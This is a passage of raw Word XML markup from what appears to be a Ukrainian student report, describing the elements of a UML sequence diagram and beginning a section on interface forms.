      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:instrText>/</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText>wiki</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:instrText>/</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:instrText>UML</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:instrText>"</w:instrText>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:rStyle w:val="a4"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>UML</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRPr="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Основними</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>елементами</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>діаграми</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>послідовності</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> є </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>позначення</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:hyperlink r:id="rId54" w:history="1">
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>об'єктів</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Прямокутники</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> з </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>назвами</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>об'єктів</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>вертикальні</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> «</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>лінії</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>життя</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>» (</w:t>
      </w:r>
      <w:hyperlink r:id="rId55" w:history="1">
        <w:r w:rsidRPr="0060216E">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:color w:val="000000"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:lang w:val="ru-RU"/>
          </w:rPr>
          <w:t>англ.</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>lifeline</w:t>
      </w:r>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>що</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>відображають</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>плин</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> часу, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>прямокутники</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>що</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>відображають</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>діяльність</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>об'єкта</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>або</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>виконання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> ним </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>певної</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>функції</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>прямокутники</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> на пунктирною «</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>лінії</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>життя</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">»), і </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>стрілки</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>що</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>показують</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>обмін</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> сигналами </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>або</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>повідомленнями</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>між</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>об'єктами</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Діаграма</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>послідовності</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>представлені</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>на</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>малюнку</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.4</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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5324475" cy="872871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4475" cy="8728710"/>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t>Малюнок 2.4 - Діаграма послідовності</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0060216E" w:rsidRDefault="0060216E" w:rsidP="0060216E">
      <w:pPr>
        <w:pStyle w:val="a5"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="22" w:name="__RefHeading___Toc10641141"/>
      <w:bookmarkStart w:id="23" w:name="_Toc10727438"/>
      <w:bookmarkEnd w:id="22"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">2.3 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>Розробка</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> форм </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>інтерфейсу</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve"> і </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="0060216E">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>опис</w:t>
      </w:r>
